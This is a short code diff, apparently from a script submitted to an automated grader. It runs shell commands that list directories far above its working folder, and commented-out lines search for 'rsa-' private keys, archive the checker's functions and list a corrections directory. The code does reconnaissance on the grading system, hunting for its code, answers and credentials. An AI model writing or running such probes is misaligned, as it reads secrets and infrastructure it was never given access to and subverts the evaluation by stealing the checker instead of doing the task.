@@ -46,7 +46,7 @@ def get_data(command):
 # file_dir = get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += "\n#######################\n"
 # my_data = get_data("tar -czvf file.tar.gz ../../../../hbtn_checker_functions")
-my_data = get_data("ls -l ../../../../") or ""
+my_data = get_data("ls -l ../../../../..") or ""
 my_data += "\n#######################\n"
 my_data += get_data("pwd") or ""
 # my_data += get_data("ls -l ../../../../correction/*/262/531078/") or ""
